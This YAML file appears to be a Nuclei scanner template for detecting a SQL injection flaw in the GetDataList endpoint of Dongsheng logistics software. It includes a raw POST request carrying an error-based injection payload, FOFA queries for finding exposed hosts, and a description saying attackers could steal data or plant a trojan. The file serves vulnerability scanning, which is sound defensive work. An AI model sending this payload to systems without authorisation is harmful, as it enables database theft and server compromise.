http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - 转换成数据类型 int 时失败
            - 在将 nvarchar 值
        - status:
            - 500
          type: status
      matchers-condition: and
      raw:
        - |
          POST /Account/Chfee_hexiao/GetDataList HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded

          start=0&condition=db_name()>0&limit=10
id: dongshengwuliu-GetDataList-sql
info:
    author: Superhero
    description: |-
        fofa: body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
        东胜物流软件 GetDataList 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 东胜物流软件 GetDataList SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/LkenoQ5faJgHR-rctXp4jw
    severity: high
    tags:
        - 东胜物流软件
